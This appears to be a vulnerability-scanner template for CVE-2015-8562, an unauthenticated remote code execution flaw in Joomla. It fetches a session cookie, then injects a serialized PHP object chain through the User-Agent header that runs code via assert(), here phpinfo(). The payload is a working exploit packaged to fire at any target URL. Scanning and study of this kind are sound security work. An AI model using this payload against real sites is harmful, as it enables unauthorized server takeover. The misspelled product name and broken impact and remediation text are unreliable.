id: CVE-2015-8562

info:
  name: Jooma HTTP Header Unauthenticated RCE => CVE-2015-8562
  author: Kim Dongyoung (Kairos-hk), bolkv, n0ming, RoughBoy0723
  severity: High
  description: |
    Jooma CMS's HTTP Header Unauthenticated RCE
  impact: |
    4 bytes when saving the header provided by the user to the db session table Send utf-8 characters to cut off the input, run the next session and read it from the db, then the desired payload This is an RCE vulnerability that allows execution of .
  remediation: |
    The vulnerability applies from 1.5.0 to 3.4.5. Affects a range of versions.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2015-8562
    - https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2015-8562
  classification:
    cvss-metrics: (AV:N/AC:L/Au:N/C:P/I:P/A:P)
    cvss-score: 7.5
    cve-id: CVE-2015-8562
  metadata:
    framework: Jooma
  tags: cve,cve2015, rce, php, joomla

requests:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Host: "{{Hostname}}"
      Connection: close
      Accept: "*/*"
    extractors:
      - type: regex
        name: cookies
        part: header
        regex:
          - "Set-Cookie: ([^;]+;)"

  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Host: "{{Hostname}}"
      User-Agent: "123}__test|O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:37:\"phpinfo();JFactory::getConfig();exit;\";}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}ùåÜ"
      Cookie: "{{cookies}}"
      Connection: close
      Accept: "*/*"
    matchers:
      - type: word
        part: body
        words:
          - "PHP Version"
